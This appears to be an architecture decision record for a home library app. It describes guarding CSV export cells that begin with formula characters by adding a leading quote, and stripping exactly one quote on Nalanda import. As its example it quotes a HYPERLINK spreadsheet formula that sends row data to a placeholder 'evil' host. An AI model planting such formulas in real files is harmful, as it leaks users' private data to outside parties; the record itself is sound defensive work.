# §16 #91 — The export guards formula-leading cells with `'`, and a Nalanda import strips exactly one

**Decided:** 2026-10-01 (review before 1.8.0). Cited as `ARCH.md §16 #91`; "§N" is a section of [ARCH.md](../../ARCH.md), "#N" another decision here.

`csvEscape()` quoted a cell for commas, quotes and newlines and nothing else, so a text cell
beginning with `=`, `+`, `-`, `@`, a tab or a carriage return left `/export.csv` as a live
formula: opened in Excel, LibreOffice or Google Sheets, `=HYPERLINK("https://evil/?"&D2&E2,
"Open")` sends the rest of the row — notes, location, loans — to another host, and Sheets'
`IMPORTXML` does it without a click. Every field the export writes passes a form of this
household's, except one: a recommendation's title and creators are copied from what a
connected household sent (#58) when a member wants it, so a connection could plant one.

**What was decided:**
- **On the way out, a `'` in front.** A text cell matching `/^[=+\-@\t\r']/` goes out as
  `'…`, the spreadsheets' own text marker, which they show without the quote. A cell that
  already began with `'` is guarded the same way (`''…`), so the next rule loses nothing.
  Numbers are never guarded: a count or a rating is never a formula, and a negative one
  would be a bug elsewhere.
- **On the way in, exactly one `'` off.** `mapNalandaRow()` strips one leading `'` from every
  cell before anything else, so `=1+1` and `'quoted` come back as they went out. Only the
  Nalanda mapper does this: a libib, Goodreads, StoryGraph or LibraryThing file never had the
  guard, and Goodreads' own `="…"` guards on its ISBN columns are still read by `unguard()`.
  A spreadsheet that kept the `'` as text, or dropped it as a marker, round-trips either way
  — the strip is one quote, not every quote.
- **Nothing else neutralises text.** Titles, notes and the rest are stored as typed; the
  guard is the export's alone, and the app's pages escape as they always have.

**What it rules out:** stripping the leading character (lossy: *+1 Forever* is a title);
guarding every cell (a spreadsheet shows a stray quote on numbers and dates); refusing a
recommendation whose title starts with `=` (it is a title, and the inbox already takes any
text as escaped text, #58); a guard the import leaves in place (the title would gain a
quote on every round trip).

Touches §6 (export), §9 (strings from another instance). Tests: `test/csv.spec.ts`
(`csvEscape`), `test/csv-roundtrip.spec.ts` (`=1+1` and `'quoted` survive export → import),
`test/recommend.spec.ts` (a recommended-then-wanted item's title leaves the export guarded).
